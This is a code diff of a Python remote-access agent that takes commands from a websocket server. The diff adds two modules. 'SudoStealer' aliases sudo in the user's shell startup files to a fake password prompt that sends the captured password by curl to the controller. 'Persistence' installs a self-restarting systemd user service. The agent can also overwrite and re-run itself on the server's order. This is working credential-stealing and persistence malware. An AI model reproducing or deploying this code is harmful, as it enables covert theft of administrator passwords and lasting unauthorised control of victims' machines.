@@ -1,14 +1,6 @@
 #!/usr/bin/env python3
 
-import os
-import subprocess
-import pickle
-import time
-import sys
-import json
-import urllib.request, urllib.parse
-import traceback
-import socket
+import os, subprocess, pickle, time, sys, json, traceback, socket, stat, urllib.request # Stdlib
 import asyncio
 
 try:
@@ -27,11 +19,96 @@ state = {
 	"uid": None,
 	"version": 1,
 	"servers": ["127.0.0.1:8000"],
-	"modules": {},
+	"persistence": {
+		"enabled": False,
+	},
+	"sudostealer": {
+		"enabled": False,
+	},
 }
 
-modules = {}
 current_host = ""
+
+class SudoStealer:
+	rcs = ["~/.bashrc","~/.zshrc"]
+	dialogpath = os.path.abspath(__file__) + ".sudo"
+	append = f"\nalias sudo='SUDO_ASKPASS={dialogpath} sudo -A'"
+	
+	async def enable():	
+		DIALOG = """#!/usr/bin/env sh
+username=$(whoami)
+read -s -p "[sudo] password for $username: " password 1>&2
+echo "" 1>&2
+# echo "$username:$password" >> ~/passwords.txt
+curl --silent --output /dev/null -d "$username:$password" "{}"
+echo "$password"
+"""
+		
+		for i in SudoStealer.rcs:
+			i = os.path.expanduser(i)
+			if os.path.exists(i):
+				with open(i, 'r') as f:
+					content = f.read()
+				if not content.endswith(SudoStealer.append):
+					with open(i, 'a') as f:
+						f.write(SudoStealer.append)
+		
+		with open(SudoStealer.dialogpath, 'w') as f:
+			f.write(DIALOG.format(f"http://{current_host}/machines/api/{state['version']}/{state['uid']}/sudostealer/upload"))
+		st = os.stat(SudoStealer.dialogpath)
+		os.chmod(SudoStealer.dialogpath, st.st_mode | stat.S_IEXEC)
+		state["sudostealer"]["enabled"] = True
+		await msg({"event":"module_enabled", "name":"sudostealer"})
+
+	def remove_alias():
+		for i in SudoStealer.rcs:
+			i = os.path.expanduser(i)
+			if os.path.exists(i):
+				with open(i, 'r') as f:
+					content = f.read()
+				if content.endswith(SudoStealer.append):
+					with open(i, 'w') as f:
+						f.write(content.removesuffix(SudoStealer.append))
+	async def disable():
+		SudoStealer.remove_alias()
+		try:
+			os.remove(SudoStealer.dialogpath)
+		except OSError:
+			pass
+		state["sudostealer"]["enabled"] = False
+		await msg({"event":"module_disabled", "name":"sudostealer"})
+
+class Persistence:
+	sysd_dir = os.path.expanduser("~/.config/systemd/user/")
+	service_name = f"{state['uid']}.service"
+	service_path = os.path.join(sysd_dir, service_name)
+	
+	async def enable():
+		SERVICE_CONFIG = '''
+[Unit]
+After=network.target
+
+[Service]
+ExecStart={}
+Restart=always
+
+[Install]
+WantedBy=default.target
+'''
+		os.makedirs(Persistence.sysd_dir, exist_ok=True)
+		with open(Persistence.service_path, "w") as f:
+			f.write(SERVICE_CONFIG.format(sys.executable + " " + script_path))
+
+		subprocess.run(["systemctl", "--user", "--now", "enable", Persistence.service_name])
+		state["persistence"]["enabled"] = True
+		await msg({"event":"module_enabled", "name":"persistence"})
+		sys.exit()
+
+	async def disable():
+		subprocess.run(["systemctl", "--user", "disable", Persistence.service_name])
+		os.remove(Persistence.service_path)
+		state["persistence"]["enabled"] = False
+		await msg({"event":"module_disabled", "name":"persistence"})
 
 def load_state():
 	global state
@@ -50,9 +127,8 @@ async def log(data: dict=None, tags:list[str]=[]):
 		o["data"] = data
 	await ws.send(json.dumps(o))
 
-async def module_msg(module:str, data: dict):
-	o = {"event":"module", "module": module, "data": data}
-	await ws.send(json.dumps(o))
+async def msg(data:dict):
+	await ws.send(json.dumps(data))
 
 async def safe_call(callable) -> bool:
 	try:
@@ -82,19 +158,13 @@ async def main():
 				except Exception:
 					traceback.print_exc()
 		
-		for i in modules.values():
-			if "onload" in i:
-				await safe_call(i["onload"])
-		
 		for server in state["servers"]:
 			try:
 				async with connect(f"ws://{server}/machines/ws/{state['version']}/{state['uid']}") as websocket:
 					current_host = server
 					ws = websocket
 					print("Joined")
-					for i in modules.values():
-						if "onconnect" in i:
-							await safe_call(i["onconnect"])
+					
 					# websocket.send()
 					while True:
 						try:
@@ -117,19 +187,13 @@ async def main():
 												with open(script_path, "w") as f:
 													f.write(c["code"])
 												os.execv(sys.executable, [sys.executable] + sys.argv)
-											case "install_module":
-												state["modules"][c["name"]] = {"code": c["code"]}
-												exec(c["code"], globals(), locals())
-												if await safe_call(modules[c["name"]]["install"]):
-													await websocket.send(json.dumps({"event":"module_installed", "name": c["name"]}))
-													save_state()
-													if "postinstall" in modules[c["name"]]: await safe_call(modules[c["name"]]["postinstall"])
-											case "uninstall_module":
-												if await safe_call(modules[c["name"]]["uninstall"]):
-													if c["name"] in state["modules"]: del state["modules"][c["name"]]
-													if c["name"] in modules: del modules[c["name"]]
-													await websocket.send(json.dumps({"event":"module_uninstalled", "name": c["name"]}))
-												save_state()
+											case "enable_module":
+												if c["name"] == "persistence": await Persistence.enable()
+												elif c["name"] == "sudostealer": await SudoStealer.enable()
+											case "disable_module":
+												if c["name"] == "persistence": await Persistence.disable()
+												elif c["name"] == "sudostealer": await SudoStealer.disable()
+											
 									except Exception:
 										traceback.print_exc()
 										await log(data={"event": "exception", "code": traceback.format_exc()}, tags=["fail","order","error"])
@@ -149,9 +213,4 @@ async def main():
 
 if __name__ == "__main__":
 	load_state()
-	for i in state["modules"]:
-		try:
-			exec(state["modules"][i]["code"])
-		except Exception:
-			traceback.print_exc()
 	asyncio.run(main())
